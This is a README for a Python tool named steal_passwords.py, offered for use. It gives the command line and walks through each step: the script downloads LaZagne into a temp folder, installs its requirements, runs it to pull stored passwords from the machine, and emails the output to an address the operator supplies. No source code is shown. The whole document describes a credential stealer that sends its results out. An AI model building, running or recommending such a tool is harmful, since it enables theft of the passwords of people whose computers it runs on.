# Report-LaZagne-output-to-Mail

# Usage
python steal_passwords.py -f \<from_emailID> -p \<from_emailID_password> -t \<to_emailID>


some of the repositories to somewhat senseless coz i am throwing all what i have learned on my way and combining them to see whether they seem to have different results or just the same as the simple script

## How the script works:
1. First this script takes 3 system arguments (from email id, password for from email id, to email id)
2. If none of these are mentioned then the Backup class comes into the picture to get the required input to run the script prompting the user for the required input
3. Then starts script work by locating the admin temp file in the system by using the module [tempfile](https://docs.python.org/3/library/tempfile.html)
4. Then the script downloads the tool [LaZagne](https://github.com/AlessandroZ/LaZagne) in the temp folder
5. With the operating system that is being used by the user, it performs the required changes in directory and also in installing requirements
6. Then the downloaded tools gets executed and then output is sent to the mail 
7. This mail is configured to send mail form from_emailID to to_emailID with a subject "LaZagne output"


## Modules used in this script
1. os
2. sys
3. time
4. shutil
5. smtplib
6. tempfile
7. requests
8. argparse
9. subprocess
10. zipfile
